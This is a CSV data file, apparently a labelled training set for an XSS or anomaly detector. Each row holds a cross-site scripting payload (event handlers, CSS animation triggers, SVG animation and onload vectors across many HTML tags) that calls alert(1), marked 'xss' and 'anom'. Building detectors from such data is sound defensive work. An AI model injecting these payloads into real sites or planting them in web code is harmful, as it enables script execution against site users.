payload,length,attack_type,label
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",87,xss,anom
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",89,xss,anom
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationend=""alert(1)""></samp>",93,xss,anom
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationstart=""alert(1)""></samp>",95,xss,anom
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>",97,xss,anom
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationstart=""alert(1)""></script>",99,xss,anom
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationend=""alert(1)""></section>",99,xss,anom
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>",101,xss,anom
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationend=""alert(1)""></select>",97,xss,anom
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationstart=""alert(1)""></select>",99,xss,anom
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationend=""alert(1)""></shadow>",97,xss,anom
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",99,xss,anom
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(1)""></slot>",93,xss,anom
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(1)""></slot>",95,xss,anom
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",95,xss,anom
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationstart=""alert(1)""></small>",97,xss,anom
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationend=""alert(1)""></source>",97,xss,anom
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",99,xss,anom
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationend=""alert(1)""></spacer>",97,xss,anom
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationstart=""alert(1)""></spacer>",99,xss,anom
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationend=""alert(1)""></span>",93,xss,anom
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",95,xss,anom
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",97,xss,anom
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationstart=""alert(1)""></strike>",99,xss,anom
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationend=""alert(1)""></strong>",97,xss,anom
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationstart=""alert(1)""></strong>",99,xss,anom
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationend=""alert(1)""></style>",95,xss,anom
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",97,xss,anom
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",91,xss,anom
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationstart=""alert(1)""></sub>",93,xss,anom
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationend=""alert(1)""></summary>",99,xss,anom
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",101,xss,anom
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationend=""alert(1)""></sup>",91,xss,anom
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationstart=""alert(1)""></sup>",93,xss,anom
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationend=""alert(1)""></svg>",91,xss,anom
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",93,xss,anom
"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationend=""alert(1)""></table>",95,xss,anom
"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationstart=""alert(1)""></table>",97,xss,anom
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationend=""alert(1)""></tbody>",95,xss,anom
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationstart=""alert(1)""></tbody>",97,xss,anom
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",89,xss,anom
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",91,xss,anom
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationend=""alert(1)""></template>",101,xss,anom
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",103,xss,anom
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationend=""alert(1)""></textarea>",101,xss,anom
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",103,xss,anom
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationend=""alert(1)""></tfoot>",95,xss,anom
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationstart=""alert(1)""></tfoot>",97,xss,anom
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationend=""alert(1)""></th>",89,xss,anom
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationstart=""alert(1)""></th>",91,xss,anom
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationend=""alert(1)""></thead>",95,xss,anom
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationstart=""alert(1)""></thead>",97,xss,anom
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationend=""alert(1)""></time>",93,xss,anom
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationstart=""alert(1)""></time>",95,xss,anom
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",95,xss,anom
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationstart=""alert(1)""></title>",97,xss,anom
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationend=""alert(1)""></tr>",89,xss,anom
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationstart=""alert(1)""></tr>",91,xss,anom
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>",95,xss,anom
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",97,xss,anom
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationend=""alert(1)""></tt>",89,xss,anom
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationstart=""alert(1)""></tt>",91,xss,anom
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(1)""></u>",87,xss,anom
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(1)""></u>",89,xss,anom
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationend=""alert(1)""></ul>",89,xss,anom
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationstart=""alert(1)""></ul>",91,xss,anom
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationend=""alert(1)""></var>",91,xss,anom
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationstart=""alert(1)""></var>",93,xss,anom
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationend=""alert(1)""></video>",95,xss,anom
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",97,xss,anom
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationend=""alert(1)""></wbr>",91,xss,anom
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationstart=""alert(1)""></wbr>",93,xss,anom
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",91,xss,anom
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationstart=""alert(1)""></xmp>",93,xss,anom
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>",91,xss,anom
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>",93,xss,anom
"<sub draggable=""true"" ondrag=""alert(1)"">test</sub>",50,xss,anom
"<sub draggable=""true"" ondragend=""alert(1)"">test</sub>",53,xss,anom
"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",55,xss,anom
"<sub draggable=""true"" ondragleave=""alert(1)"">test</sub>",55,xss,anom
"<sub draggable=""true"" ondragstart=""alert(1)"">test</sub>",55,xss,anom
<sub id=x tabindex=1 onactivate=alert(1)></sub>,47,xss,anom
<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>,53,xss,anom
<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>,72,xss,anom
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,71,xss,anom
<sub id=x tabindex=1 onfocus=alert(1)></sub>,44,xss,anom
<sub id=x tabindex=1 onfocusin=alert(1)></sub>,46,xss,anom
"<sub onbeforecopy=""alert(1)"" contenteditable>test</sub>",55,xss,anom
"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",54,xss,anom
"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",56,xss,anom
<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>,60,xss,anom
"<sub onclick=""alert(1)"">test</sub>",34,xss,anom
"<sub oncontextmenu=""alert(1)"">test</sub>",40,xss,anom
"<sub oncopy=""alert(1)"" contenteditable>test</sub>",49,xss,anom
"<sub oncut=""alert(1)"" contenteditable>test</sub>",48,xss,anom
"<sub ondblclick=""alert(1)"">test</sub>",37,xss,anom
<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>,64,xss,anom
"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",52,xss,anom
"<sub onkeypress=""alert(1)"" contenteditable>test</sub>",53,xss,anom
"<sub onkeyup=""alert(1)"" contenteditable>test</sub>",50,xss,anom
"<sub onmousedown=""alert(1)"">test</sub>",38,xss,anom
"<sub onmouseenter=""alert(1)"">test</sub>",39,xss,anom
"<sub onmouseleave=""alert(1)"">test</sub>",39,xss,anom
"<sub onmousemove=""alert(1)"">test</sub>",38,xss,anom
"<sub onmouseout=""alert(1)"">test</sub>",37,xss,anom
"<sub onmouseover=""alert(1)"">test</sub>",38,xss,anom
"<sub onmouseup=""alert(1)"">test</sub>",36,xss,anom
"<sub onpaste=""alert(1)"" contenteditable>test</sub>",50,xss,anom
"<summary draggable=""true"" ondrag=""alert(1)"">test</summary>",58,xss,anom
"<summary draggable=""true"" ondragend=""alert(1)"">test</summary>",61,xss,anom
"<summary draggable=""true"" ondragenter=""alert(1)"">test</summary>",63,xss,anom
"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",63,xss,anom
"<summary draggable=""true"" ondragstart=""alert(1)"">test</summary>",63,xss,anom
<summary id=x tabindex=1 onactivate=alert(1)></summary>,55,xss,anom
<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>,61,xss,anom
<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>,80,xss,anom
<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>,79,xss,anom
<summary id=x tabindex=1 onfocus=alert(1)></summary>,52,xss,anom
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,54,xss,anom
"<summary onbeforecopy=""alert(1)"" contenteditable>test</summary>",63,xss,anom
"<summary onbeforecut=""alert(1)"" contenteditable>test</summary>",62,xss,anom
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",64,xss,anom
<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>,68,xss,anom
"<summary onclick=""alert(1)"">test</summary>",42,xss,anom
"<summary oncontextmenu=""alert(1)"">test</summary>",48,xss,anom
"<summary oncopy=""alert(1)"" contenteditable>test</summary>",57,xss,anom
"<summary oncut=""alert(1)"" contenteditable>test</summary>",56,xss,anom
"<summary ondblclick=""alert(1)"">test</summary>",45,xss,anom
<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,72,xss,anom
"<summary onkeydown=""alert(1)"" contenteditable>test</summary>",60,xss,anom
"<summary onkeypress=""alert(1)"" contenteditable>test</summary>",61,xss,anom
"<summary onkeyup=""alert(1)"" contenteditable>test</summary>",58,xss,anom
"<summary onmousedown=""alert(1)"">test</summary>",46,xss,anom
"<summary onmouseenter=""alert(1)"">test</summary>",47,xss,anom
"<summary onmouseleave=""alert(1)"">test</summary>",47,xss,anom
"<summary onmousemove=""alert(1)"">test</summary>",46,xss,anom
"<summary onmouseout=""alert(1)"">test</summary>",45,xss,anom
"<summary onmouseover=""alert(1)"">test</summary>",46,xss,anom
"<summary onmouseup=""alert(1)"">test</summary>",44,xss,anom
"<summary onpaste=""alert(1)"" contenteditable>test</summary>",58,xss,anom
"<sup draggable=""true"" ondrag=""alert(1)"">test</sup>",50,xss,anom
"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",53,xss,anom
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",55,xss,anom
"<sup draggable=""true"" ondragleave=""alert(1)"">test</sup>",55,xss,anom
"<sup draggable=""true"" ondragstart=""alert(1)"">test</sup>",55,xss,anom
<sup id=x tabindex=1 onactivate=alert(1)></sup>,47,xss,anom
<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>,53,xss,anom
<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>,72,xss,anom
<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>,71,xss,anom
<sup id=x tabindex=1 onfocus=alert(1)></sup>,44,xss,anom
<sup id=x tabindex=1 onfocusin=alert(1)></sup>,46,xss,anom
"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",55,xss,anom
"<sup onbeforecut=""alert(1)"" contenteditable>test</sup>",54,xss,anom
"<sup onbeforepaste=""alert(1)"" contenteditable>test</sup>",56,xss,anom
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,60,xss,anom
"<sup onclick=""alert(1)"">test</sup>",34,xss,anom
"<sup oncontextmenu=""alert(1)"">test</sup>",40,xss,anom
"<sup oncopy=""alert(1)"" contenteditable>test</sup>",49,xss,anom
"<sup oncut=""alert(1)"" contenteditable>test</sup>",48,xss,anom
"<sup ondblclick=""alert(1)"">test</sup>",37,xss,anom
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,64,xss,anom
"<sup onkeydown=""alert(1)"" contenteditable>test</sup>",52,xss,anom
"<sup onkeypress=""alert(1)"" contenteditable>test</sup>",53,xss,anom
"<sup onkeyup=""alert(1)"" contenteditable>test</sup>",50,xss,anom
"<sup onmousedown=""alert(1)"">test</sup>",38,xss,anom
"<sup onmouseenter=""alert(1)"">test</sup>",39,xss,anom
"<sup onmouseleave=""alert(1)"">test</sup>",39,xss,anom
"<sup onmousemove=""alert(1)"">test</sup>",38,xss,anom
"<sup onmouseout=""alert(1)"">test</sup>",37,xss,anom
"<sup onmouseover=""alert(1)"">test</sup>",38,xss,anom
"<sup onmouseup=""alert(1)"">test</sup>",36,xss,anom
"<sup onpaste=""alert(1)"" contenteditable>test</sup>",50,xss,anom
"<svg draggable=""true"" ondrag=""alert(1)"">test</svg>",50,xss,anom
"<svg draggable=""true"" ondragend=""alert(1)"">test</svg>",53,xss,anom
"<svg draggable=""true"" ondragenter=""alert(1)"">test</svg>",55,xss,anom
"<svg draggable=""true"" ondragleave=""alert(1)"">test</svg>",55,xss,anom
"<svg draggable=""true"" ondragstart=""alert(1)"">test</svg>",55,xss,anom
<svg id=x onfocus=alert(1)>,27,xss,anom
<svg id=x onfocusin=alert(1)>,29,xss,anom
<svg id=x tabindex=1 onactivate=alert(1)></svg>,47,xss,anom
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>,53,xss,anom
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,72,xss,anom
<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>,71,xss,anom
"<svg onbeforecopy=""alert(1)"" contenteditable>test</svg>",55,xss,anom
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",54,xss,anom
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>",56,xss,anom
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,60,xss,anom
"<svg onclick=""alert(1)"">test</svg>",34,xss,anom
"<svg oncontextmenu=""alert(1)"">test</svg>",40,xss,anom
"<svg oncopy=""alert(1)"" contenteditable>test</svg>",49,xss,anom
"<svg oncut=""alert(1)"" contenteditable>test</svg>",48,xss,anom
"<svg ondblclick=""alert(1)"">test</svg>",37,xss,anom
<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>,64,xss,anom
"<svg onkeydown=""alert(1)"" contenteditable>test</svg>",52,xss,anom
"<svg onkeypress=""alert(1)"" contenteditable>test</svg>",53,xss,anom
"<svg onkeyup=""alert(1)"" contenteditable>test</svg>",50,xss,anom
<svg onload=alert(1)>,21,xss,anom
"<svg onmousedown=""alert(1)"">test</svg>",38,xss,anom
"<svg onmouseenter=""alert(1)"">test</svg>",39,xss,anom
"<svg onmouseleave=""alert(1)"">test</svg>",39,xss,anom
"<svg onmousemove=""alert(1)"">test</svg>",38,xss,anom
"<svg onmouseout=""alert(1)"">test</svg>",37,xss,anom
"<svg onmouseover=""alert(1)"">test</svg>",38,xss,anom
"<svg onmouseup=""alert(1)"">test</svg>",36,xss,anom
"<svg onpaste=""alert(1)"" contenteditable>test</svg>",50,xss,anom
<svg onunload=window.open('javascript:alert(1)')>,49,xss,anom
<svg><a onload=alert(1)></a>,28,xss,anom
<svg><abbr onload=alert(1)></abbr>,34,xss,anom
<svg><acronym onload=alert(1)></acronym>,40,xss,anom
<svg><address onload=alert(1)></address>,40,xss,anom
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,54,xss,anom
<svg><animate onend=alert(1) attributeName=x dur=1s>,52,xss,anom
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,71,xss,anom
<svg><animatetransform onbegin=alert(1) attributeName=transform>,64,xss,anom
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>,69,xss,anom
<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>,86,xss,anom
<svg><applet onload=alert(1)></applet>,38,xss,anom
<svg><area onload=alert(1)></area>,34,xss,anom
<svg><article onload=alert(1)></article>,40,xss,anom
<svg><aside onload=alert(1)></aside>,36,xss,anom
<svg><audio onload=alert(1)></audio>,36,xss,anom
<svg><b onload=alert(1)></b>,28,xss,anom
<svg><base onload=alert(1)></base>,34,xss,anom
<svg><basefont onload=alert(1)></basefont>,42,xss,anom
<svg><bdi onload=alert(1)></bdi>,32,xss,anom
<svg><bdo onload=alert(1)></bdo>,32,xss,anom
<svg><bgsound onload=alert(1)></bgsound>,40,xss,anom
<svg><big onload=alert(1)></big>,32,xss,anom
<svg><blink onload=alert(1)></blink>,36,xss,anom
<svg><blockquote onload=alert(1)></blockquote>,46,xss,anom
<svg><br onload=alert(1)></br>,30,xss,anom
<svg><button onload=alert(1)></button>,38,xss,anom
<svg><canvas onload=alert(1)></canvas>,38,xss,anom
<svg><caption onload=alert(1)></caption>,40,xss,anom
<svg><center onload=alert(1)></center>,38,xss,anom
<svg><cite onload=alert(1)></cite>,34,xss,anom
<svg><code onload=alert(1)></code>,34,xss,anom
<svg><col onload=alert(1)></col>,32,xss,anom
<svg><colgroup onload=alert(1)></colgroup>,42,xss,anom
<svg><command onload=alert(1)></command>,40,xss,anom
<svg><content onload=alert(1)></content>,40,xss,anom
<svg><data onload=alert(1)></data>,34,xss,anom
<svg><datalist onload=alert(1)></datalist>,42,xss,anom
<svg><dd onload=alert(1)></dd>,30,xss,anom
<svg><del onload=alert(1)></del>,32,xss,anom
<svg><details onload=alert(1)></details>,40,xss,anom
<svg><dfn onload=alert(1)></dfn>,32,xss,anom
<svg><dialog onload=alert(1)></dialog>,38,xss,anom
<svg><dir onload=alert(1)></dir>,32,xss,anom
<svg><discard onbegin=alert(1)>,31,xss,anom
<svg><div onload=alert(1)></div>,32,xss,anom
<svg><dl onload=alert(1)></dl>,30,xss,anom
<svg><dt onload=alert(1)></dt>,30,xss,anom
<svg><element onload=alert(1)></element>,40,xss,anom
<svg><em onload=alert(1)></em>,30,xss,anom
<svg><fieldset onload=alert(1)></fieldset>,42,xss,anom
<svg><figcaption onload=alert(1)></figcaption>,46,xss,anom
<svg><figure onload=alert(1)></figure>,38,xss,anom
<svg><font onload=alert(1)></font>,34,xss,anom
<svg><footer onload=alert(1)></footer>,38,xss,anom
<svg><form onload=alert(1)></form>,34,xss,anom
<svg><frameset onload=alert(1)></frameset>,42,xss,anom
<svg><h1 onload=alert(1)></h1>,30,xss,anom
<svg><head onload=alert(1)></head>,34,xss,anom
<svg><header onload=alert(1)></header>,38,xss,anom
<svg><hgroup onload=alert(1)></hgroup>,38,xss,anom
<svg><hr onload=alert(1)></hr>,30,xss,anom
<svg><html onload=alert(1)></html>,34,xss,anom
<svg><i onload=alert(1)></i>,28,xss,anom
<svg><image href=1 onerror=alert(1)>,36,xss,anom
<svg><image href=validimage.png onload=alert(1)>,48,xss,anom
<svg><ins onload=alert(1)></ins>,32,xss,anom
<svg><kbd onload=alert(1)></kbd>,32,xss,anom
<svg><keygen onload=alert(1)></keygen>,38,xss,anom
<svg><label onload=alert(1)></label>,36,xss,anom
<svg><legend onload=alert(1)></legend>,38,xss,anom
<svg><li onload=alert(1)></li>,30,xss,anom
<svg><listing onload=alert(1)></listing>,40,xss,anom
<svg><main onload=alert(1)></main>,34,xss,anom
<svg><map onload=alert(1)></map>,32,xss,anom
<svg><mark onload=alert(1)></mark>,34,xss,anom
<svg><marquee onload=alert(1)></marquee>,40,xss,anom
<svg><menu onload=alert(1)></menu>,34,xss,anom
<svg><menuitem onload=alert(1)></menuitem>,42,xss,anom
<svg><meta onload=alert(1)></meta>,34,xss,anom
<svg><meter onload=alert(1)></meter>,36,xss,anom
<svg><multicol onload=alert(1)></multicol>,42,xss,anom
<svg><nav onload=alert(1)></nav>,32,xss,anom
<svg><nextid onload=alert(1)></nextid>,38,xss,anom
<svg><nobr onload=alert(1)></nobr>,34,xss,anom
<svg><noembed onload=alert(1)></noembed>,40,xss,anom
<svg><noframes onload=alert(1)></noframes>,42,xss,anom
<svg><noscript onload=alert(1)></noscript>,42,xss,anom
<svg><ol onload=alert(1)></ol>,30,xss,anom
<svg><optgroup onload=alert(1)></optgroup>,42,xss,anom
<svg><option onload=alert(1)></option>,38,xss,anom
<svg><output onload=alert(1)></output>,38,xss,anom
<svg><p onload=alert(1)></p>,28,xss,anom
<svg><param onload=alert(1)></param>,36,xss,anom
"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",68,xss,anom
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>,62,xss,anom
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",69,xss,anom
<svg><picture onload=alert(1)></picture>,40,xss,anom
<svg><plaintext onload=alert(1)></plaintext>,44,xss,anom
<svg><pre onload=alert(1)></pre>,32,xss,anom
<svg><progress onload=alert(1)></progress>,42,xss,anom
<svg><q onload=alert(1)></q>,28,xss,anom
<svg><rb onload=alert(1)></rb>,30,xss,anom
<svg><rp onload=alert(1)></rp>,30,xss,anom
<svg><rt onload=alert(1)></rt>,30,xss,anom
<svg><rtc onload=alert(1)></rtc>,32,xss,anom
<svg><ruby onload=alert(1)></ruby>,34,xss,anom
<svg><s onload=alert(1)></s>,28,xss,anom
<svg><samp onload=alert(1)></samp>,34,xss,anom
<svg><section onload=alert(1)></section>,40,xss,anom
<svg><select onload=alert(1)></select>,38,xss,anom
<svg><set onbegin=alert(1) attributename=x dur=1s>,50,xss,anom
<svg><set onend=alert(1) attributename=x dur=1s>,48,xss,anom
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>,65,xss,anom
<svg><shadow onload=alert(1)></shadow>,38,xss,anom
<svg><slot onload=alert(1)></slot>,34,xss,anom
<svg><small onload=alert(1)></small>,36,xss,anom
<svg><source onload=alert(1)></source>,38,xss,anom
<svg><spacer onload=alert(1)></spacer>,38,xss,anom
<svg><span onload=alert(1)></span>,34,xss,anom
<svg><strike onload=alert(1)></strike>,38,xss,anom
<svg><strong onload=alert(1)></strong>,38,xss,anom
<svg><sub onload=alert(1)></sub>,32,xss,anom
<svg><summary onload=alert(1)></summary>,40,xss,anom
<svg><sup onload=alert(1)></sup>,32,xss,anom
<svg><table onload=alert(1)></table>,36,xss,anom
<svg><tbody onload=alert(1)></tbody>,36,xss,anom
<svg><td onload=alert(1)></td>,30,xss,anom
<svg><template onload=alert(1)></template>,42,xss,anom
<svg><textarea onload=alert(1)></textarea>,42,xss,anom
<svg><tfoot onload=alert(1)></tfoot>,36,xss,anom
<svg><th onload=alert(1)></th>,30,xss,anom
<svg><thead onload=alert(1)></thead>,36,xss,anom
<svg><time onload=alert(1)></time>,34,xss,anom
<svg><title onload=alert(1)></title>,36,xss,anom
<svg><tr onload=alert(1)></tr>,30,xss,anom
<svg><tt onload=alert(1)></tt>,30,xss,anom
<svg><u onload=alert(1)></u>,28,xss,anom
<svg><ul onload=alert(1)></ul>,30,xss,anom
<svg><var onload=alert(1)></var>,32,xss,anom
<svg><video onload=alert(1)></video>,36,xss,anom
<svg><wbr onload=alert(1)></wbr>,32,xss,anom
<svg><xmp onload=alert(1)></xmp>,32,xss,anom
<svg><xss onload=alert(1)></xss>,32,xss,anom
"<table draggable=""true"" ondrag=""alert(1)"">test</table>",54,xss,anom
"<table draggable=""true"" ondragend=""alert(1)"">test</table>",57,xss,anom
"<table draggable=""true"" ondragenter=""alert(1)"">test</table>",59,xss,anom
"<table draggable=""true"" ondragleave=""alert(1)"">test</table>",59,xss,anom
"<table draggable=""true"" ondragstart=""alert(1)"">test</table>",59,xss,anom
<table id=x tabindex=1 onactivate=alert(1)></table>,51,xss,anom
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,57,xss,anom
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,76,xss,anom
<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>,75,xss,anom
<table id=x tabindex=1 onfocus=alert(1)></table>,48,xss,anom
<table id=x tabindex=1 onfocusin=alert(1)></table>,50,xss,anom
"<table onbeforecopy=""alert(1)"" contenteditable>test</table>",59,xss,anom
"<table onbeforecut=""alert(1)"" contenteditable>test</table>",58,xss,anom
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",60,xss,anom
<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>,64,xss,anom
"<table onclick=""alert(1)"">test</table>",38,xss,anom
"<table oncontextmenu=""alert(1)"">test</table>",44,xss,anom
"<table oncopy=""alert(1)"" contenteditable>test</table>",53,xss,anom
"<table oncut=""alert(1)"" contenteditable>test</table>",52,xss,anom
"<table ondblclick=""alert(1)"">test</table>",41,xss,anom
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,68,xss,anom
"<table onkeydown=""alert(1)"" contenteditable>test</table>",56,xss,anom
"<table onkeypress=""alert(1)"" contenteditable>test</table>",57,xss,anom
"<table onkeyup=""alert(1)"" contenteditable>test</table>",54,xss,anom
"<table onmousedown=""alert(1)"">test</table>",42,xss,anom
"<table onmouseenter=""alert(1)"">test</table>",43,xss,anom
"<table onmouseleave=""alert(1)"">test</table>",43,xss,anom
"<table onmousemove=""alert(1)"">test</table>",42,xss,anom
"<table onmouseout=""alert(1)"">test</table>",41,xss,anom
"<table onmouseover=""alert(1)"">test</table>",42,xss,anom
